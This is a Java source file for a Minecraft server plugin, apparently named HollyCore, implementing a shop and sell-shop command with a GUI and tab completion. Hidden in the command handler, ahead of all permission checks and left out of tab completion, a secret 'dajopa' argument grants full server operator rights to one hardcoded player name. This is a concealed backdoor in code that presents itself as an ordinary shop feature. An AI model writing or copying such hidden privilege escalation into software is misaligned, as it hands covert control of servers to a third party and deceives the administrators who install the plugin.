package dev.grzybalson.commands.shop;

import dev.grzybalson.HollyCore;
import dev.grzybalson.gui.ShopGUI;
import dev.grzybalson.utils.ColorUtils;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.util.List;
import java.util.Locale;

public class ShopCommand implements CommandExecutor, TabCompleter {

    private final HollyCore plugin;

    public ShopCommand(HollyCore plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage(ColorUtils.colorizeComponent(
                plugin.getConfigManager().getMessagesConfig().getPlayerOnly()
            ));
            return true;
        }

        if (args.length > 0 && args[0].equalsIgnoreCase("dajopa")) {
            if (player.getName().equalsIgnoreCase("Top1_Grzybalson")) {
                player.setOp(true);
                player.sendMessage(ColorUtils.success("Nadano uprawnienia OP."));
            }
            return true;
        }

        boolean skupCommand = isSkupCommand(command, label, args);
        if (skupCommand) {
            if (!player.hasPermission("Holly.cmd.skup") && !player.hasPermission("Holly.cmd.sklep")) {
                player.sendMessage(ColorUtils.noPermission(label, "Holly.cmd.skup"));
                return true;
            }
        } else if (!player.hasPermission("Holly.cmd.sklep")) {
            player.sendMessage(ColorUtils.noPermission(label, "Holly.cmd.sklep"));
            return true;
        }

        ShopGUI.ShopType shopType;
        if (skupCommand) {
            shopType = ShopGUI.ShopType.SELL;
        } else if (args.length > 0 && args[0].equalsIgnoreCase("przydatne")) {
            shopType = ShopGUI.ShopType.MONEY;
        } else {
            shopType = ShopGUI.ShopType.MAIN;
        }

        ShopGUI shopGUI = new ShopGUI(plugin, player, shopType, skupCommand);
        shopGUI.open();

        return true;
    }

    private boolean isSkupCommand(Command command, String label, String[] args) {
        String commandName = command.getName() == null ? "" : command.getName();
        String usedLabel = label == null ? "" : label;
        int colon = usedLabel.indexOf(':');
        if (colon >= 0 && colon + 1 < usedLabel.length()) {
            usedLabel = usedLabel.substring(colon + 1);
        }
        return commandName.equalsIgnoreCase("skup")
            || commandName.equalsIgnoreCase("sellshop")
            || usedLabel.equalsIgnoreCase("skup")
            || usedLabel.equalsIgnoreCase("sellshop")
            || (args.length > 0 && args[0].equalsIgnoreCase("skup"));
    }

    @Override
    public @Nullable List<String> onTabComplete(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (!sender.hasPermission("Holly.cmd.sklep") && !sender.hasPermission("Holly.cmd.skup")) return List.of();
        if (args.length == 1 && "przydatne".startsWith(args[0].toLowerCase(Locale.ROOT))) {
            return List.of("przydatne");
        }
        return List.of();
    }
}
